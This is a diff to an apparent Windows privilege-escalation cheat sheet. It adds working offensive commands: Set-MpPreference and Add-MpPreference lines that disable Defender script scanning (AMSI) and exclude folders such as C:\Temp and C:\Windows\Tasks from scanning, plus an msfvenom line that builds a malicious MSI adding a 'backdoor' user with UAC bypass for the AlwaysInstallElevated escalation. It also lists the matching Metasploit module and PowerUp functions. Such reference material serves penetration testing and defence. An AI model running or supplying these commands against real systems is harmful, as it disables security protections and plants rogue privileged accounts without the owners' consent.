@@ -254,6 +254,8 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 
 ## Antivirus & Detections
 
+Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
+
 ### Windows Defender
 
 ```powershell
@@ -263,6 +265,13 @@ PS C:\> Get-MpComputerStatus
 # disable Real Time Monitoring
 PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
 PS C:\> Set-MpPreference -DisableIOAVProtection $true
+
+# disable AMSI (set to 0 to enable)
+PS C:\> Set-MpPreference -DisableScriptScanning 1 
+
+# exclude a folder
+PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
+PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
 ```
 
 ### AppLocker Enumeration
@@ -777,16 +786,23 @@ Check if these registry values are set to "1".
 ```bat
 $ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 $ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+$ Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
+$ Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
 Then create an MSI package and install it.
 
 ```powershell
 $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
 $ msiexec /quiet /qn /i C:\evil.msi
 ```
 
-Technique also available in Metasploit : `exploit/windows/local/always_install_elevated`
+Technique also available in :
+* Metasploit : `exploit/windows/local/always_install_elevated`
+* PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`
+
 
 ## EoP - Insecure GUI apps
 
